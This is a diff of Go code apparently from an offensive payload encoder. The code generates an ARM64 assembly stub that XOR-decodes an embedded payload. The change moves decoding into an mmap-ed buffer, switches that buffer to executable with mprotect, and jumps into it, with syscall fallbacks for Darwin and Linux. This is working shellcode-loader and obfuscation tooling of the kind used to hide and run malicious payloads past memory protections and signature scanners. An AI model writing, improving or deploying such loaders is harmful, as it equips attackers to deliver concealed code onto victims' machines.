@@ -192,30 +192,93 @@ func buildXorDynamicStub(keyTerm byte, payloadTerm []byte) ([]byte, error) {
 	payloadVal := binary.LittleEndian.Uint16(payloadTerm)
 
 	src := strings.Join([]string{
-		"adr x0, payload",   // x0 = key start
-		"mov x1, x0",        // x1 = scan pointer
+		"adr x19, payload",  // x19 = key start
+		"mov x1, x19",       // x1 = scan pointer
 		"find_key_term:",    //
 		"ldrb w2, [x1], #1", // read key byte
 		fmt.Sprintf("cmp w2, #0x%02X", keyTerm),
 		"b.ne find_key_term", // keep scanning
-		"mov x8, x1",         // x8 = payload start / jump target
+		"mov x20, x1",        // x20 = payload start / jump target
 		"mov x3, x1",         // x3 = payload decode pointer
-		"mov x4, x0",         // x4 = key decode pointer
+		"mov x4, x19",        // x4 = key decode pointer
 		fmt.Sprintf("mov w10, #0x%04X", payloadVal),
+
+		// Scan for the payload terminator (it is guaranteed not to occur in the
+		// encoded payload), then allocate a RW buffer, decode into it, mprotect
+		// to RX, and jump.
+		"mov x9, x3", // x9 = scan pointer
+		"find_payload_term:",
+		"ldrh w7, [x9]",
+		"cmp w7, w10",
+		"b.eq payload_term_found",
+		"add x9, x9, #1",
+		"b find_payload_term",
+		"payload_term_found:",
+		"sub x22, x9, x20", // x22 = payload len in bytes (terminator excluded)
+
+		// mmap(NULL, payloadLen, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0)
+		"mov x0, #0",
+		"mov x1, x22",
+		"mov x2, #3",      // PROT_READ|PROT_WRITE
+		"mov x3, #0x1002", // MAP_PRIVATE|MAP_ANON (darwin)
+		"mov x4, #-1",
+		"mov x5, #0",
+		"mov x8, #222", // Linux: __NR_mmap
+		fmt.Sprintf("movz x16, #0x%X", uint16(0x020000C5&0xffff)),
+		fmt.Sprintf("movk x16, #0x%X, lsl #16", uint16((0x020000C5>>16)&0xffff)),
+		fmt.Sprintf("movk x16, #0x%X, lsl #32", uint16((0x020000C5>>32)&0xffff)),
+		fmt.Sprintf("movk x16, #0x%X, lsl #48", uint16((0x020000C5>>48)&0xffff)),
+		"svc #0",
+		// Darwin MAP_ANON is 0x1000, Linux MAP_ANONYMOUS is 0x20.
+		// Try Darwin flags first, then retry with Linux flags if the syscall fails.
+		"tbnz x0, #63, mmap_linux",
+		"b mmap_ok",
+		"mmap_linux:",
+		"mov x0, #0",
+		"mov x1, x22",
+		"mov x2, #3",    // PROT_READ|PROT_WRITE
+		"mov x3, #0x22", // MAP_PRIVATE|MAP_ANONYMOUS (linux)
+		"mov x4, #-1",
+		"mov x5, #0",
+		"mov x8, #222", // Linux: __NR_mmap
+		fmt.Sprintf("movz x16, #0x%X", uint16(0x020000C5&0xffff)),
+		fmt.Sprintf("movk x16, #0x%X, lsl #16", uint16((0x020000C5>>16)&0xffff)),
+		fmt.Sprintf("movk x16, #0x%X, lsl #32", uint16((0x020000C5>>32)&0xffff)),
+		fmt.Sprintf("movk x16, #0x%X, lsl #48", uint16((0x020000C5>>48)&0xffff)),
+		"svc #0",
+		"mmap_ok:",
+		"mov x23, x0", // x23 = dest base
+		"mov x24, x0", // x24 = dest ptr
+		"mov x3, x20", // restore src pointer (payload start)
+		"mov x4, x19", // restore key pointer
+
 		"decode_loop:",
+		"cmp x3, x9", // reached terminator?
+		"b.eq decode_done",
+
 		"ldrb w5, [x4], #1", // load key byte
 		fmt.Sprintf("cmp w5, #0x%02X", keyTerm),
 		"b.ne have_key",
-		"mov x4, x0",        // reset key pointer
+		"mov x4, x19",       // reset key pointer
 		"ldrb w5, [x4], #1", // load first key byte
 		"have_key:",
-		"ldrb w6, [x3]", // load payload byte
+		"ldrb w6, [x3], #1", // load payload byte + advance
 		"eor w6, w6, w5",
-		"strb w6, [x3], #1", // store + advance payload
-		"ldrh w7, [x3]",     // check for payload terminator (2 bytes)
-		"cmp w7, w10",
-		"b.ne decode_loop",
-		"br x8", // jump to decoded payload
+		"strb w6, [x24], #1", // store + advance dest
+		"b decode_loop",
+
+		"decode_done:",
+		// mprotect(dst, payloadLen, PROT_READ|PROT_EXEC)
+		"mov x0, x23",
+		"mov x1, x22",
+		"mov x2, #5",   // PROT_READ|PROT_EXEC
+		"mov x8, #226", // Linux: __NR_mprotect
+		fmt.Sprintf("movz x16, #0x%X", uint16(0x0200004A&0xffff)),
+		fmt.Sprintf("movk x16, #0x%X, lsl #16", uint16((0x0200004A>>16)&0xffff)),
+		fmt.Sprintf("movk x16, #0x%X, lsl #32", uint16((0x0200004A>>32)&0xffff)),
+		fmt.Sprintf("movk x16, #0x%X, lsl #48", uint16((0x0200004A>>48)&0xffff)),
+		"svc #0",
+		"br x23", // jump to decoded payload
 		"payload:",
 	}, "\n")
 
